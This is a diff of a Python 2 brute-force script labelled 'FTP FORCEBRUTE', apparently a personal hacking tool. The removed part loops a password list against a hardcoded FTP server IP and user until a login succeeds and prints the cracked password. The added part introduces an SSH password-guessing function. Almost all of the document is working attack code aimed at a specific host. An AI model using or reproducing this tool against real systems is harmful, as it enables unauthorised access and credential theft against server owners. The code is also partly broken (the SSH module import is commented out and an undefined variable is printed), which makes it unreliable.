@@ -1,10 +1,9 @@
 ### 	FTP FORCEBRUTE 	###
 ### 	OSIRIS 			###
-import ftplib, sys
-import time
-from progressbar import *
+import ftplib, sys#, pxssh
 
-def ftpbreaker(addr, user, passwd, i):
+
+def ftpbreaker(addr, user, passwd):
 	try:
 		con = ftplib.FTP(addr)
 		con.login(user, passwd)
@@ -16,26 +15,10 @@ def ftpbreaker(addr, user, passwd, i):
 
 	except KeyboardInterrupt:
 		sys.exit()
-addr ="91.134.135.18"
-port ="21"
-widgets = ['[>] Brute: ', Percentage(), ' ', Bar(marker='#',left='[',right=']')]
-user = "ftpuser"
-passwdsPath ="passwds.txt"
-passwdLines = len(open(passwdsPath).readlines())
-print "[>] Trying passwords for user: "+user
-bar = ProgressBar(widgets=widgets, maxval=passwdLines)
-passwdsFile = open(passwdsPath, 'r')
-bar.start()
-c=0
-#t1 = datetime.now()
-for passwd in passwdsFile:
-	con = ftpbreaker(addr, user, passwd, c)
-	c+=1
-	bar.update(c)
-	if con == 1:
-		break
-bar.finish()
-#t2 = datetime.now()
-#t = t2-t1
-print "[!] Password found :) > "+passwd
-print "[?] The brute force took: "+t
+def sshBreaker(addr, user, passwd):
+	try:
+		conn = pxssh.pxssh()
+		conn.login(addr,user,passwd)
+		return conn
+	except:
+		print "[!] Couldn't connect to the server"
